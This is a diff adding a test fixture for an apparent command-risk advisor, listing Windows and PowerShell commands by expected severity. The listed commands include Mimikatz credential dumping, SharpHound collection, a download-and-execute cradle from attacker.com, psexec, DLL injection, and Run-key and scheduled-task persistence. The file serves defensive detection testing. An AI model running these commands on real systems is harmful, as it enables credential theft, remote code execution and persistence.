@@ -1,0 +1,26 @@
+# Empire Advisor Test Fixtures
+# One command per line for acceptance testing
+
+# Critical severity - should trigger block advisory
+Invoke-Mimikatz -DumpCreds
+mimikatz sekurlsa::logonpasswords
+SharpHound.exe -CollectionMethod All
+
+# High severity - should trigger warn advisory
+IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
+psexec \\target01 cmd.exe /c "whoami"
+Invoke-DllInjection -ProcessID 1234 -Dll payload.dll
+schtasks /create /tn UpdateTask /tr "powershell.exe -File C:\update.ps1" /sc onlogon
+
+# Medium severity - should trigger warn or allow with info
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami"
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\update.exe"
+Invoke-Expression (Get-Content C:\payload.ps1)
+net group "Domain Admins" /domain
+
+# Low severity - should allow with low risk
+Test-NetConnection -ComputerName 192.168.1.1 -Port 445
+
+# Clean command - should allow with minimal risk
+Get-Process | Where-Object {$_.CPU -gt 100}
+Get-Service | Select-Object Name,Status
